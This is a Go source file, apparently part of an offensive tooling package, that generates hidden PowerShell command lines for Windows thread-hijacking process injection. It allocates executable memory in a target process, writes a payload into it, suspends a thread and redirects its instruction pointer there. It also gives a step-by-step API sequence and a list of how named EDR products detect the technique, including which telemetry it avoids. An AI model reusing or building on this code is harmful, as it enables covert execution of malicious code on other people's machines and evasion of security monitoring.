package processinjection

import "fmt"

func InjectThreadHijacking(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$t=$p.Threads|Select-Object -First 1; `+
			`$th=[PoshWin32.Kernel32]::OpenThread(0x001F03FF,$false,$t.Id); `+
			`[PoshWin32.Kernel32]::SuspendThread($th); `+
			`$ctx=New-Object PoshWin32.CONTEXT; $ctx.ContextFlags=0x100000; `+
			`[PoshWin32.Kernel32]::GetThreadContext($th,[ref]$ctx); `+
			`$ctx.Rip=$addr; $ctx.Rax=$addr; `+
			`[PoshWin32.Kernel32]::SetThreadContext($th,$ctx); `+
			`[PoshWin32.Kernel32]::ResumeThread($th)"`,
		targetPID,
	), nil
}

func InjectThreadContextModification(targetPID int, targetThreadID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if targetThreadID <= 0 {
		return "", fmt.Errorf("invalid thread ID: %d", targetThreadID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$th=[PoshWin32.Kernel32]::OpenThread(0x001F03FF,$false,%d); `+
			`[PoshWin32.Kernel32]::SuspendThread($th); `+
			`$ctx=New-Object PoshWin32.CONTEXT; $ctx.ContextFlags=0x100000; `+
			`[PoshWin32.Kernel32]::GetThreadContext($th,[ref]$ctx); `+
			`$ctx.Rip=$addr; `+
			`[PoshWin32.Kernel32]::SetThreadContext($th,$ctx); `+
			`[PoshWin32.Kernel32]::ResumeThread($th)"`,
		targetPID, targetThreadID,
	), nil
}

func ThreadHijackingAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess",
		2: "VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> lpRemoteAddr",
		3: "WriteProcessMemory(hProcess, lpRemoteAddr, lpBuffer, dwSize, NULL)",
		4: "CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) -> hSnapshot",
		5: "Thread32First/Thread32Next -> find thread owned by target process",
		6: "OpenThread(THREAD_ALL_ACCESS, FALSE, threadID) -> hThread",
		7: "SuspendThread(hThread) -> suspend target thread",
		8: "GetThreadContext(hThread, &ctx) -> save current context",
		9: "SetThreadContext(hThread, ctx.Rip = lpRemoteAddr) -> hijack RIP to shellcode",
		10: "ResumeThread(hThread) -> thread executes shellcode",
	}
}

func ThreadHijackingDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 10":    "ProcessAccess detected for OpenProcess",
		"Sysmon EventID 8":     "CreateRemoteThread NOT triggered - thread hijacking does not create new threads",
		"EventID 4688":         "Process Creation not relevant - operates on existing threads",
		"ETW Microsoft-Windows-Kernel-Process": "SetThreadContext events captured if telemetry enabled",
		"CrowdStrike Falcon":   "CS detects via kernel callback for SetThreadContext with non-standard RIP values",
		"SentinelOne":          "S1 monitors SuspendThread + SetThreadContext + ResumeThread chain",
		"Microsoft Defender":   "MDE detects via suspicious SetThreadContext calls where RIP points to allocated memory",
		"Carbon Black":         "CB hooks SetThreadContext and flags calls where RIP target is within PAGE_EXECUTE_READWRITE memory",
	}
}
